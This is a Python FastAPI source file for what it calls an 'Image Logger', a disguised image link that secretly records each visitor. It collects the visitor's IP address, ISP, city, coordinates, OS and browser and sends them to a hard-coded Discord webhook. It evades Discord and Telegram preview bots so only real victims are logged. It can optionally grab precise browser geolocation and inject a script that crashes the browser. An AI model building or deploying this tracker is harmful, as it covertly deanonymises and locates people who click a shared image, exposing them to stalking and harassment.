from fastapi import FastAPI, Request, BackgroundTasks
from fastapi.responses import HTMLResponse, Response, RedirectResponse
from urllib import parse
import traceback
import requests
import base64
import httpagentparser

app = FastAPI()

config = {
    "webhook": "https://discord.com/api/webhooks/1550573118043721830/d8cNikEgKWLlhZOYSQMrrj6vVrmysupE6FrltVfHR41isGp5Sv2xzgolOkjzmTJc_R7d",
    "image": "https://cdn2.picryl.com/photo/2014/03/04/polish-soviet-propaganda-poster-11-177ecb-640.jpg",
    "imageArgument": True,
    "username": "Image Logger",
    "color": 0x00FFFF,
    "crashBrowser": False,
    "accurateLocation": False,
    "message": {
        "doMessage": False,
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger",
        "richMessage": True,
    },
    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1,
    "redirect": {
        "redirect": False,
        "page": "https://your-link.here"
    },
}

blacklistedIPs = ("27", "104", "143", "164")

def botCheck(ip, useragent):
    if ip and ip.startswith(("34", "35")):
        return "Discord"
    if useragent and useragent.startswith("TelegramBot"):
        return "Telegram"
    return False

def reportError(error):
    try:
        requests.post(config["webhook"], json={
            "username": config["username"],
            "content": "@everyone",
            "embeds": [{
                "title": "Image Logger - Error",
                "color": config["color"],
                "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
            }]
        })
    except Exception:
        pass

def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
    if ip and ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    if bot:
        if config["linkAlerts"]:
            try:
                requests.post(config["webhook"], json={
                    "username": config["username"],
                    "content": "",
                    "embeds": [{
                        "title": "Image Logger - Link Sent",
                        "color": config["color"],
                        "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
                    }],
                })
            except Exception:
                pass
        return

    ping = "@everyone"
    try:
        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    except Exception:
        return

    if info.get("proxy"):
        if config["vpnCheck"] == 2:
            return
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info.get("hosting"):
        if config["antiBot"] == 4:
            if not info.get("proxy"):
                return
        elif config["antiBot"] == 3:
            return
        elif config["antiBot"] == 2:
            if not info.get("proxy"):
                ping = ""
        elif config["antiBot"] == 1:
            ping = ""

    os_str, browser = httpagentparser.simple_detect(useragent or "")
    
    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [{
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info.get('isp', 'Unknown')}`
> **ASN:** `{info.get('as', 'Unknown')}`
> **Country:** `{info.get('country', 'Unknown')}`
> **Region:** `{info.get('regionName', 'Unknown')}`
> **City:** `{info.get('city', 'Unknown')}`
> **Coords:** `{str(info.get('lat', ''))+', '+str(info.get('lon', '')) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info.get('timezone', 'Unknown/Unknown').split('/')[1].replace('_', ' ') if '/' in info.get('timezone','') else info.get('timezone','Unknown')} ({info.get('timezone', 'Unknown/Unknown').split('/')[0] if '/' in info.get('timezone','') else ''})`
> **Mobile:** `{info.get('mobile', False)}`
> **VPN:** `{info.get('proxy', False)}`
> **Bot:** `{info.get('hosting', False) if info.get('hosting') and not info.get('proxy') else 'Possibly' if info.get('hosting') else 'False'}`

**PC Info:**
> **OS:** `{os_str}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
        }]
    }
    
    if url:
        embed["embeds"][0].update({"thumbnail": {"url": url}})
    try:
        requests.post(config["webhook"], json=embed)
    except Exception:
        pass
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
}

@app.api_route("/{catchall:path}", methods=["GET", "POST"])
async def handle_request(request: Request, catchall: str, background_tasks: BackgroundTasks):
    try:
        user_agent = request.headers.get("user-agent", "")
        ip = request.headers.get("x-forwarded-for") or request.client.host
        if "," in ip:
            ip = ip.split(",")[0].strip()

        if ip.startswith(blacklistedIPs):
            return Response(status_code=403)

        query_params = dict(request.query_params)
        url = config["image"]
        if config["imageArgument"] and ("url" in query_params or "id" in query_params):
            encoded_url = query_params.get("url") or query_params.get("id")
            try:
                url = base64.b64decode(encoded_url.encode()).decode()
            except Exception:
                pass

        if botCheck(ip, user_agent):
            background_tasks.add_task(makeReport, ip, user_agent, None, request.url.path, url)
            if config["buggedImage"]:
                return Response(content=binaries["loading"], media_type="image/jpeg")
            return RedirectResponse(url=url)
        
        else:
            coords = None
            if query_params.get("g") and config["accurateLocation"]:
                try:
                    coords = base64.b64decode(query_params.get("g").encode()).decode()
                except Exception:
                    pass
            
            result = makeReport(ip, user_agent, coords, request.url.path, url)
            message = config["message"]["message"]

            if config["message"]["richMessage"] and result:
                os_str, browser = httpagentparser.simple_detect(user_agent)
                message = message.replace("{ip}", ip or "Unknown")
                message = message.replace("{isp}", result.get("isp", "Unknown"))
                message = message.replace("{asn}", result.get("as", "Unknown"))
                message = message.replace("{country}", result.get("country", "Unknown"))
                message = message.replace("{region}", result.get("regionName", "Unknown"))
                message = message.replace("{city}", result.get("city", "Unknown"))
                message = message.replace("{lat}", str(result.get("lat", "")))
                message = message.replace("{long}", str(result.get("lon", "")))
                message = message.replace("{timezone}", f"{result.get('timezone', 'Unknown/Unknown').split('/')[1].replace('_', ' ') if '/' in result.get('timezone','') else result.get('timezone','Unknown')} ({result.get('timezone', 'Unknown/Unknown').split('/')[0] if '/' in result.get('timezone','') else ''})")
                message = message.replace("{mobile}", str(result.get("mobile", False)))
                message = message.replace("{vpn}", str(result.get("proxy", False)))
                message = message.replace("{bot}", str(result.get("hosting", False) if result.get("hosting") and not result.get("proxy") else 'Possibly' if result.get("hosting") else 'False'))
                message = message.replace("{browser}", browser)
                message = message.replace("{os}", os_str)

            data = f'''<style>body {{ margin: 0; padding: 0; }} div.img {{ background-image: url('{url}'); background-position: center center; background-repeat: no-repeat; background-size: contain; width: 100vw; height: 100vh; }}</style><div class="img"></div>'''.encode()

            if config["message"]["doMessage"]:
                data = message.encode()
            
            if config["crashBrowser"]:
                data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>'

            if config["redirect"]["redirect"]:
                data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()

            if config["accurateLocation"]:
                data += b"""<script>
var currenturl = window.location.href;
if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}
</script>"""
            return HTMLResponse(content=data, status_code=200)

    except Exception:
        reportError(traceback.format_exc())
        return HTMLResponse(content="500 - Internal Server Error", status_code=500)
